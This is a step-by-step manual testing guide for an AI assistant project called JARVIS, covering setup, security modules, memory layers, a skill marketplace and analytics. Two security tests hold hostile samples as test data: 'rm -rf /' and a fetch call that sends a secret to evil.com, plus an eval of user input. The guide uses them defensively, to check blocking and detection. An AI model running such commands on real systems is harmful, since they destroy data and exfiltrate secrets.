# JARVIS Enhancement — Step-by-Step Testing Guide

> Follow these steps **in order**. Each test tells you exactly what to type, what to click, and what result to expect.

---

## Prerequisites

Before you start testing, make sure you have:

1. **Open your terminal** (PowerShell on Windows)
2. **Navigate to the JARVIS folder:**
   ```
   cd C:\Users\MUCL\OneDrive\Desktop\examples\JARVIS
   ```
3. **Install dependencies** (if not already):
   ```
   npm install
   ```
4. **Build the project:**
   ```
   npm run build
   ```
   - ✅ **Expected:** No errors. You should see TypeScript compilation output.
   - ❌ **If errors:** Run `npx tsc --noEmit` to see the specific error messages.

---

## Test 1: TypeScript Compilation Check

**What you're testing:** The entire codebase compiles without errors.

### Steps:

1. Open your terminal
2. Type this command and press **Enter**:
   ```
   npx tsc --noEmit
   ```
3. Wait for it to finish (about 10-15 seconds)

### What to expect:
- ✅ **PASS:** No output at all — just returns to the prompt. This means zero errors.
- ❌ **FAIL:** You see error messages with file names and line numbers.

---

## Test 2: Setup Wizard

**What you're testing:** The interactive setup wizard runs and creates config files.

### Steps:

1. In your terminal, type:
   ```
   npx ts-node --esm scripts/setup-wizard.ts --help
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:** You see a help message like:
   ```
   Usage: npx jarvis-setup [options]

   Options:
     --quick    Run quick setup with defaults
     --help     Show this help message
   ```

### Now test **Quick Mode**:

3. Type this command:
   ```
   npx ts-node --esm scripts/setup-wizard.ts --quick
   ```
4. Press **Enter**

### What to expect:
- ✅ **PASS:** You see:
   - A banner: `🤖 JARVIS Setup Wizard`
   - `Running quick setup with defaults...`
   - `✓ Created .env file`
   - `✓ Created jarvis.config.json`
   - `✓ Created data directories`
   - `🎉 Setup Complete!`
- ✅ **Verify:** Check that these files were created:
   - Open `.env` — should contain `JARVIS_PROVIDER=gemini`, `JARVIS_SECURITY_ENABLED=true`
   - Open `jarvis.config.json` — should contain provider, security, and inference settings
   - Check that folder `data/memory` exists
   - Check that folder `data/security` exists
   - Check that folder `data/logs` exists

### Now test **Interactive Mode** (Optional):

5. Type:
   ```
   npx ts-node --esm scripts/setup-wizard.ts
   ```
6. Press **Enter**
7. You'll see: `📡 Step 1: Choose Your AI Provider`
8. Type `1` and press **Enter** (selects Gemini)
9. Follow the prompts for each step:
   - **Step 2:** Enter an API key or leave blank and press **Enter**
   - **Step 3:** Press **Enter** for default data directory
   - **Step 4:** Press **Enter** to enable security (default: Yes)
   - **Step 4b:** Press **Enter** to enable tiered inference
   - **Step 5:** Type `2` and press **Enter** (selects "Casual" persona)
10. Wait for config generation

### What to expect:
- ✅ **PASS:** After each step you see a green `✓` confirmation. At the end you see `🎉 Setup Complete!`

---

## Test 3: Quick Start Preflight

**What you're testing:** The preflight checker validates your environment.

### Steps:

1. Make sure `.env` exists (if you ran Test 2, it should)
2. Type:
   ```
   npx ts-node --esm scripts/quick-start.ts
   ```
3. Press **Enter**

### What to expect:
- ✅ **PASS:** You see:
   ```
   🤖 JARVIS Quick Start

   🔍 Running preflight checks...

   ✓ .env file exists
   ✓ AI provider configured  (or ⚠ if no key set)
   ✓ Data directory exists (./data)
   ✓ Node.js version v20.x.x  (your version)
   ```
- The script will then try to build and start JARVIS. You can press **Ctrl+C** to stop it after the preflight checks pass.

---

## Test 4: Security — CapabilityManager

**What you're testing:** The security system initializes and enforces permissions.

### Steps:

1. Create a test file. Type:
   ```
   npx ts-node --esm -e "
   import { initializeSecurity } from './src/security/index.js';

   async function test() {
     const { capabilityManager, skillScanner } = await initializeSecurity({ preset: 'balanced' });
     
     // Test 1: Check a safe tool
     const safeResult = await capabilityManager.checkPermission('read_file', { path: './package.json' });
     console.log('Safe tool (read_file):', safeResult.allowed ? '✓ ALLOWED' : '✗ DENIED');
     
     // Test 2: Check a dangerous tool
     const dangerousResult = await capabilityManager.checkPermission('run_command', { command: 'rm -rf /' });
     console.log('Dangerous cmd (rm -rf /):', dangerousResult.allowed ? '✓ ALLOWED (unexpected!)' : '✗ BLOCKED');
     console.log('  Reason:', dangerousResult.reason);
     
     // Test 3: Check policy
     console.log('Active policy:', capabilityManager.getActivePolicy().name);
     
     // Test 4: Check audit log
     console.log('Audit entries:', capabilityManager.getAuditLog().length);
     
     console.log('\nAll security tests passed! ✅');
   }
   test().catch(console.error);
   "
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:**
   ```
   Safe tool (read_file): ✓ ALLOWED
   Dangerous cmd (rm -rf /): ✗ BLOCKED
     Reason: Command matches blocked pattern
   Active policy: balanced
   Audit entries: 2
   
   All security tests passed! ✅
   ```

---

## Test 5: Security — SkillScanner

**What you're testing:** The malware scanner detects suspicious patterns.

### Steps:

1. Type:
   ```
   npx ts-node --esm -e "
   import { SkillScanner } from './src/security/SkillScanner.js';
   
   const scanner = new SkillScanner();
   
   // Test 1: Scan clean code
   const cleanResult = scanner.scanCode('function hello() { return \"Hello, World!\"; }', 'safe-skill.ts');
   console.log('Clean code scan:');
   console.log('  Risk score:', cleanResult.riskScore, '(should be 0)');
   console.log('  Recommendation:', cleanResult.recommendation, '(should be allow)');
   
   // Test 2: Scan suspicious code with eval
   const evalResult = scanner.scanCode('const x = eval(userInput);', 'evil-skill.ts');
   console.log('\nEval code scan:');
   console.log('  Risk score:', evalResult.riskScore, '(should be > 0)');
   console.log('  Recommendation:', evalResult.recommendation);
   console.log('  Findings:', evalResult.findings.length, 'issue(s) found');
   evalResult.findings.forEach(f => console.log('    -', f.pattern, ':', f.description));
   
   // Test 3: Scan code with data exfiltration
   const exfilResult = scanner.scanCode('fetch(\"https://evil.com/steal?data=\" + secret)', 'exfil-skill.ts');
   console.log('\nExfiltration scan:');
   console.log('  Risk score:', exfilResult.riskScore);
   console.log('  Recommendation:', exfilResult.recommendation);
   console.log('  Findings:', exfilResult.findings.length, 'issue(s)');
   
   console.log('\nAll scanner tests passed! ✅');
   "
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:** Clean code gets `allow`, eval code gets flagged with findings, exfiltration pattern detected.

---

## Test 6: Complexity Classifier

**What you're testing:** The classifier correctly categorizes simple vs complex messages.

### Steps:

1. Type:
   ```
   npx ts-node --esm -e "
   import { classifyComplexity } from './src/providers/ComplexityClassifier.js';
   
   const tests = [
     { msg: 'Hello!', expect: 'simple' },
     { msg: 'What time is it?', expect: 'simple' },
     { msg: 'Yes', expect: 'simple' },
     { msg: 'Thank you', expect: 'simple' },
     { msg: 'Write a Python script to parse JSON files and extract all email addresses', expect: 'complex' },
     { msg: 'Create a React component with TypeScript that implements drag and drop', expect: 'complex' },
     { msg: 'Analyze this codebase and suggest improvements, then refactor the main module', expect: 'complex' },
     { msg: 'Research the best database options and write a comparison report', expect: 'complex' },
   ];
   
   let passed = 0;
   let failed = 0;
   
   for (const test of tests) {
     const result = classifyComplexity(test.msg);
     const isCorrect = result.level === test.expect;
     const icon = isCorrect ? '✓' : '✗';
     console.log(\`\${icon} \"\${test.msg.slice(0, 50)}...\" → \${result.level} (score: \${result.score}) \${isCorrect ? '' : '❌ Expected: ' + test.expect}\`);
     isCorrect ? passed++ : failed++;
   }
   
   console.log(\`\n\${passed}/\${tests.length} tests passed\`);
   if (failed === 0) console.log('All classifier tests passed! ✅');
   "
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:** Simple messages score < 30, complex messages score ≥ 60. Most or all tests should pass.

---

## Test 7: Episodic Memory

**What you're testing:** Sessions are recorded and searchable as episodes.

### Steps:

1. Type:
   ```
   npx ts-node --esm -e "
   import { EpisodicMemory } from './src/memory/EpisodicMemory.js';
   
   async function test() {
     const memory = new EpisodicMemory({ filePath: './data/memory/test-episodes.json' });
     await memory.initialize();
     
     // Record a fake session
     const episode = await memory.recordSession('test-session-1', [
       { role: 'user', content: 'Can you fix the login bug?' },
       { role: 'assistant', content: 'I fixed the authentication error in login.ts' },
       { role: 'user', content: 'I prefer using TypeScript over JavaScript' },
       { role: 'assistant', content: 'Noted! I decided to use TypeScript for all future code.' },
       { role: 'user', content: 'Now implement the dashboard' },
       { role: 'assistant', content: 'Completed the dashboard component with charts and filters.' },
     ], { duration: 45 });
     
     console.log('Episode recorded:');
     console.log('  ID:', episode.id);
     console.log('  Summary:', episode.summary);
     console.log('  Mood:', episode.mood);
     console.log('  Highlights:', episode.highlights.length);
     console.log('  Tasks completed:', episode.tasksCompleted.length);
     console.log('  Decisions:', episode.decisions.length);
     console.log('  Preferences learned:', episode.preferencesLearned.length);
     
     // Search
     const results = await memory.search({ keywords: ['TypeScript'] });
     console.log('\nSearch for \"TypeScript\":', results.length, 'episode(s) found');
     
     // Get context for prompt
     const context = await memory.getEpisodicContext();
     console.log('\nEpisodic context:');
     console.log(context);
     
     // Stats
     const stats = memory.getStats();
     console.log('\nStats:', JSON.stringify(stats, null, 2));
     
     console.log('\nAll episodic memory tests passed! ✅');
   }
   test().catch(console.error);
   "
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:**
   - Episode is created with a UUID
   - Summary mentions completed tasks and decisions
   - Mood should be `routine` or `productive`
   - Highlights, tasks, decisions, and preferences arrays are populated
   - Search finds the episode when searching for "TypeScript"
   - Context generates formatted markdown

---

## Test 8: Hierarchical Memory

**What you're testing:** All 4 memory layers work together.

### Steps:

1. Type:
   ```
   npx ts-node --esm -e "
   import { HierarchicalMemory } from './src/memory/HierarchicalMemory.js';
   
   async function test() {
     const memory = new HierarchicalMemory({ workingMemorySize: 10 });
     await memory.initialize();
     
     // Layer 1: Working memory
     memory.addToWorkingMemory({ role: 'user', content: 'Hello JARVIS' });
     memory.addToWorkingMemory({ role: 'assistant', content: 'Hello! How can I help?' });
     memory.addToWorkingMemory({ role: 'user', content: 'Help me build an API' });
     
     console.log('Working memory:');
     console.log('  Messages:', memory.getWorkingMemory().length, '(should be 3)');
     console.log('  Est. tokens:', memory.getWorkingMemoryTokens());
     
     // Layer 3: Semantic memory
     const fact = await memory.rememberFact('User works on a project called AURA');
     console.log('\nSemantic fact saved:', fact.id);
     
     const pref = await memory.rememberPreference('User prefers TypeScript');
     console.log('Preference saved:', pref.id);
     
     // Get combined context
     const context = await memory.getFullContext();
     console.log('\nFull context preview:', context.slice(0, 200));
     
     // Session info
     console.log('\nSession ID:', memory.getSessionId());
     console.log('Session duration:', memory.getSessionDuration(), 'minutes');
     
     // Stats
     const stats = await memory.getStats();
     console.log('\nStats:', JSON.stringify(stats, null, 2));
     
     console.log('\nAll hierarchical memory tests passed! ✅');
   }
   test().catch(console.error);
   "
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:** Working memory shows 3 messages, semantic facts/preferences are saved with IDs, stats show correct counts.

---

## Test 9: Skill Marketplace

**What you're testing:** Browse, search, install, and uninstall skills.

### Steps:

1. Type:
   ```
   npx ts-node --esm -e "
   import { SkillMarketplace } from './src/skills/SkillMarketplace.js';
   
   async function test() {
     const marketplace = new SkillMarketplace({ skillsDir: './data/test-skills' });
     await marketplace.initialize();
     
     // Browse featured
     const featured = await marketplace.getFeatured();
     console.log('Featured skills:', featured.length);
     featured.forEach(s => console.log('  •', s.name, 'v' + s.version, '-', s.downloads, 'downloads'));
     
     // Search
     const results = await marketplace.search('docker');
     console.log('\nSearch \"docker\":', results.length, 'result(s)');
     results.forEach(r => console.log('  •', r.skill.name, '- Score:', r.matchScore.toFixed(1), '- Reason:', r.matchReason));
     
     // Install
     const installResult = await marketplace.install('jarvis-git-advanced');
     console.log('\nInstall:', installResult.message);
     
     // Try installing again (should fail)
     const dupeResult = await marketplace.install('jarvis-git-advanced');
     console.log('Duplicate install:', dupeResult.message, '(should say already installed)');
     
     // Check installed
     console.log('Is installed?', marketplace.isInstalled('jarvis-git-advanced'), '(should be true)');
     console.log('Installed count:', marketplace.getInstalled().length);
     
     // Record usage
     await marketplace.recordUsage('jarvis-git-advanced');
     console.log('Usage recorded. Count:', marketplace.getInstalled()[0]?.usageCount);
     
     // Uninstall
     const uninstallResult = await marketplace.uninstall('jarvis-git-advanced');
     console.log('\nUninstall:', uninstallResult.message);
     console.log('Is installed?', marketplace.isInstalled('jarvis-git-advanced'), '(should be false)');
     
     // Stats
     console.log('\nStats:', JSON.stringify(marketplace.getStats(), null, 2));
     
     console.log('\nAll marketplace tests passed! ✅');
   }
   test().catch(console.error);
   "
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:** 6 featured skills listed, Docker Manager found in search, install/uninstall cycle works, duplicate install blocked.

---

## Test 10: Usage Analytics

**What you're testing:** Events are tracked, stats calculated, and data flushed to disk.

### Steps:

1. Type:
   ```
   npx ts-node --esm -e "
   import { UsageAnalytics } from './src/analytics/UsageAnalytics.js';
   
   async function test() {
     const analytics = new UsageAnalytics({ dataDir: './data/test-analytics' });
     await analytics.initialize();
     
     // Start session
     analytics.startSession('test-session-1');
     console.log('Session started');
     
     // Track events
     analytics.track('message_sent', { length: 50 });
     analytics.track('message_received', { length: 200 });
     analytics.trackToolUsage('read_file', true);
     analytics.trackToolUsage('run_command', true);
     analytics.trackToolUsage('read_file', true);
     analytics.trackModelUsage(true, 500);    // Local model
     analytics.trackModelUsage(false, 1200);  // Cloud model
     analytics.trackModelUsage(true, 300);    // Local model
     console.log('Events tracked');
     
     // Get today stats
     const stats = analytics.getTodayStats();
     console.log('\nToday stats:');
     console.log('  Sessions:', stats.sessions, '(should be 1)');
     console.log('  Messages:', stats.messages, '(should be 2)');
     console.log('  Tool calls:', stats.toolCalls, '(should be 3)');
     console.log('  Local inferences:', stats.localInferences, '(should be 2)');
     console.log('  Cloud inferences:', stats.cloudInferences, '(should be 1)');
     console.log('  Est. savings: $' + stats.estimatedSavings.toFixed(4));
     console.log('  Top tools:');
     stats.topTools.forEach(t => console.log('    •', t.name, ':', t.count, 'uses'));
     
     // Cost savings summary
     const savings = analytics.getCostSavingsSummary();
     console.log('\nCost savings:');
     console.log('  Today: $' + savings.today.toFixed(4));
     console.log('  Local %:', savings.localPercent + '%', '(should be ~67%)');
     
     // End session
     analytics.endSession();
     console.log('\nSession ended');
     
     // Shutdown (flushes to disk)
     await analytics.shutdown();
     console.log('Analytics flushed to disk');
     
     console.log('\nAll analytics tests passed! ✅');
   }
   test().catch(console.error);
   "
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:** 1 session, 2 messages, 3 tool calls, 2 local / 1 cloud inference, top tool is `read_file` with 2 uses.

---

## Test 11: Tiered Provider Manager (Initialization Guard)

**What you're testing:** The new guard clause throws a clear error if you forget to call `initialize()`.

### Steps:

1. Type:
   ```
   npx ts-node --esm -e "
   import { TieredProviderManager } from './src/providers/TieredProviderManager.js';
   
   async function test() {
     const manager = new TieredProviderManager();
     
     // DO NOT call initialize() — test the guard
     try {
       await manager.generateResponse(
         [{ role: 'user', content: 'Hello' }],
         'You are a helpful assistant'
       );
       console.log('✗ Should have thrown an error!');
     } catch (error) {
       const msg = (error as Error).message;
       if (msg.includes('Call initialize()')) {
         console.log('✓ Guard clause works! Got error:', msg);
       } else {
         console.log('✗ Wrong error:', msg);
       }
     }
     
     console.log('\nInitialization guard test passed! ✅');
   }
   test().catch(console.error);
   "
   ```
2. Press **Enter**

### What to expect:
- ✅ **PASS:** You see:
   ```
   ✓ Guard clause works! Got error: TieredProviderManager: No cloud provider available. Call initialize() before generating responses.
   ```

---

## Test 12: Full Integration — End to End

**What you're testing:** Setup → Build → Start JARVIS (smoke test).

### Steps:

1. Make sure your `.env` has a valid API key (e.g., `GEMINI_API_KEY=your-key-here`)
2. Build:
   ```
   npm run build
   ```
   - ✅ **Expected:** No errors
3. Start JARVIS:
   ```
   npm start
   ```
   - ✅ **Expected:** JARVIS starts and shows a prompt or begins initialization
   - You can type `Hello` to test basic interaction
   - Press **Ctrl+C** to stop

---

## Test Results Summary

After running all tests, fill in this table:

| # | Test | Result | Notes |
|---|------|--------|-------|
| 1 | TypeScript compilation | ☐ Pass / ☐ Fail | |
| 2 | Setup Wizard | ☐ Pass / ☐ Fail | |
| 3 | Quick Start Preflight | ☐ Pass / ☐ Fail | |
| 4 | CapabilityManager | ☐ Pass / ☐ Fail | |
| 5 | SkillScanner | ☐ Pass / ☐ Fail | |
| 6 | Complexity Classifier | ☐ Pass / ☐ Fail | |
| 7 | Episodic Memory | ☐ Pass / ☐ Fail | |
| 8 | Hierarchical Memory | ☐ Pass / ☐ Fail | |
| 9 | Skill Marketplace | ☐ Pass / ☐ Fail | |
| 10 | Usage Analytics | ☐ Pass / ☐ Fail | |
| 11 | Init Guard | ☐ Pass / ☐ Fail | |
| 12 | Full Integration | ☐ Pass / ☐ Fail | |

---

## Cleanup After Testing

After testing, you can remove test data:

```
# Remove test directories
Remove-Item -Recurse -Force .\data\test-skills
Remove-Item -Recurse -Force .\data\test-analytics
Remove-Item -Force .\data\memory\test-episodes.json
```

---

> **Questions?** If any test fails, copy the full error output — it will help diagnose the issue quickly.
